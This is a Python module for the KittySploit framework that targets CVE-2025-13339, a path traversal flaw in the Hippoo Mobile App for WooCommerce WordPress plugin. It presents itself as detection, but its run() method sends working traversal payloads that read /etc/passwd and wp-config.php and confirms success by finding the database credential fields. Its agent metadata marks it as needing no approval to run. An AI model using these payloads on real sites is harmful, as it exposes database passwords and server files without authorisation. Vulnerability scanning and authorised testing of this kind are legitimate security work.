#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Hippoo Mobile App for WooCommerce plugin for WordPress is vulnerable to Path Traversal in all versions up ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hippoo Mobile App for WooCommerce <= 1.7.1 - Unauthenticated Arbitrary File Read Detection',
        'description': "The Hippoo Mobile App for WooCommerce plugin for WordPress is vulnerable to Path Traversal in all versions up to and including 1.7.1 via the template_redirect() function. The plugin registers 'hippoo_serve' as a WordPress query variable and uses it to serve PWA files from the pwa/ directory. In vulnerable versions, the user-supplied value is concatenated directly into a filesystem path without any sanitization or directory confinement check, then passed to readfile(). This allows unauthenticated attackers to read arbitrary files on the server by injecting directory traversal sequences (../).",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', 'hippoo', 'lfi', 'woocommerce'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hippoo/hippoo-mobile-app-for-woocommerce-171-unauthenticated-arbitrary-file-read',
            'https://plugins.trac.wordpress.org/changeset/3412701/',
            'https://patchstack.com/database/wordpress/plugin/hippoo/vulnerability/wordpress-hippoo-mobile-app-for-woocommerce-plugin-1-7-1-unauthenticated-arbitrary-file-read-vulnerability',
        ],
        'cve': 'CVE-2025-13339',
    }

    def run(self):
        for path in ('/?hippoo_serve=../../../../../../../etc/passwd', '/?hippoo_serve=../../../../wp-config.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('DB_NAME', 'DB_PASSWORD',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Hippoo Mobile App for WooCommerce <= 1.7.1 - Unauthenticated Arbitrary File Read detected",
                    path=path,
                )
                return True
        return False

